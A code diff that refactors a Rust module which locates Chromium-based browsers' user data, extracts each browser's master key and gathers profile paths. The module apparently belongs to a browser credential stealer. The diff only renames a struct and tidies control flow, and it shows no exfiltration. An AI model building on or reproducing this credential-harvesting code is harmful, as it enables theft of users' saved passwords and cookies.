@@ -58,14 +58,14 @@ impl ChromiumTask<'_> {
     }
 }
 
-fn get_browser(browser: &ChromiumBasedBrowser) -> Option<Browser> {
+fn get_browser(browser: &ChromiumBasedBrowser) -> Option<BrowserData> {
     if !browser.user_data.is_exists() {
         return None;
     }
 
     let master_key = unsafe { extract_master_key(&browser.user_data)? };
     if !browser.has_profiles {
-        return Some(Browser {
+        return Some(BrowserData {
             master_key,
             profiles: vec![browser.user_data.clone()]
         })
@@ -86,21 +86,19 @@ fn get_browser(browser: &ChromiumBasedBrowser) -> Option<Browser> {
     }
 
     if profiles.is_empty() {
-        return None
+        None
+    } else {
+        Some(BrowserData {
+            master_key,
+            profiles
+        })
     }
-
-    Some(Browser {
-        master_key,
-        profiles
-    })
 }
 
 fn is_in_profile_folder(path: &Path) -> bool {
-    let Some(name) = path.fullname() else {
-        return false
-    };
-
-    name.ends_with("Profile.ico") || name.ends_with("LOG")
+    path.fullname()
+        .map(|name| name.ends_with("Profile.ico") || name.ends_with("LOG"))
+        .unwrap_or(false)
 }
 
 impl Task for ChromiumTask<'_> {
@@ -112,7 +110,7 @@ impl Task for ChromiumTask<'_> {
     }
 }
 
-pub(super) struct Browser {
+pub(super) struct BrowserData {
     master_key: Vec<u8>,
     profiles: Vec<Path>,
 }
